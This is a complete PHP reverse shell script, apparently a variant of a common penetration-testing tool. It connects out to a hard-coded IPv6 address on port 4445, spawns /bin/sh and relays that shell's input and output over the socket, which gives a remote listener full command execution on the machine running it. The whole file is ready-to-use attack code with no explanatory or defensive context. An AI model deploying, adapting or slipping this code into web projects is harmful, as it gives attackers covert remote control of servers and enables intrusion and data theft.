<?php
set_time_limit (0);
$ip = '2400:7b60:6:8c7a:381c:355e:92f3:10d2';  // YOUR public IP
$port = 4445;          // Same port as listener
$chunk_size = 1400;
$shell = '/bin/sh';
$daemon = 0;
$debug = 0;

if (($f = 'stream_socket_client') && is_callable($f)) {
    $sock = $f("tcp://$ip:$port");
} elseif (($f = 'fsockopen') && is_callable($f)) {
    $sock = $f($ip, $port);
} elseif (($f = 'pfsockopen') && is_callable($f)) {
    $sock = $f($ip, $port);
} else {
    die('no socket funcs');
}
if (!$sock) { die; }
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { die; }
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
print("connected");

while (1) {
    if (feof($sock)) { break; }
    if (feof($pipes[1])) { break; }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a = NULL, $error_a = NULL, NULL);

    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
